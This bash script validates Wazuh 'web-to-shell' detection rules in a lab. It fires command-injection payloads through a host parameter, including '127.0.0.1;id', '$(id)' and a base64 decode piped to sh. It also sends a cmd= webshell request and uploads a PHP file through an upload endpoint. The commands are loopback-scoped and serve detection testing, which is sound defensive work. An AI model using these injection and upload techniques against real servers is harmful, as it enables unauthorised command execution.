#!/usr/bin/env bash
# Drive the lab victim's vulnerable apps so each web-to-shell rule fires once,
# then tell you where to look on the manager. Run from an attacker box (or the
# victim itself) pointed at the victim's web server.
#
#   ./validate.sh http://192.168.56.20
#
# Every injected command is benign and loopback-scoped: discovery (id, uname),
# a localhost fetch, a base64 decode, and a .php drop via the upload endpoint.
# No outbound connections, no reverse shells -- those tiers (rules 100530/100531)
# are validated separately and reproducibly by ../tests/logtest.py.
set -euo pipefail

VICTIM="${1:-http://127.0.0.1}"
enc() { python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))' "$1"; }
inject() { curl -s "$VICTIM/$1?host=$(enc "127.0.0.1;$2")" >/dev/null && echo "    [php]  $2"; }
injn()   { curl -s "$VICTIM/node/ping?host=$(enc "127.0.0.1;$2")" >/dev/null && echo "    [node] $2"; }

echo "[1] Shell spawn + discovery (rules 100510/100520)"
inject ping.php "id"
inject ping.php "whoami"
injn  "" "uname -a"

echo "[2] Network/transfer tool (rule 100521)"
inject ping.php "curl -s http://127.0.0.1/ -o /dev/null"

echo "[3] base64 decode (rule 100540/100541)"
inject ping.php "echo aWQ= | base64 -d | sh"

echo "[4] Interactive-webshell correlation (rule 100550)"
for c in id whoami hostname; do inject ping.php "$c"; done

echo "[5] Suspicious web requests (rules 100560/100562)"
curl -s "$VICTIM/ping.php?host=$(enc '$(id)')" >/dev/null && echo "    command payload in query"
curl -s "$VICTIM/shell.php?cmd=ls" >/dev/null || true && echo "    cmd= parameter"

echo "[6] Webshell drop via file upload (rule 100570)"
TMP="$(mktemp -d)"; printf '<?php echo "lab marker"; ?>\n' > "$TMP/note.php"
curl -s -F "file=@$TMP/note.php" "$VICTIM/upload.php" >/dev/null && echo "    uploaded note.php"
rm -rf "$TMP"

cat <<EOF

Done. On the Wazuh manager, confirm the alerts:
  tail -f /var/ossec/logs/alerts/alerts.json \\
    | python3 -c 'import sys,json; [print(json.loads(l)["rule"]["id"], json.loads(l)["rule"]["description"]) for l in sys.stdin]'
or in the dashboard, filter rule.groups:web_to_shell
EOF
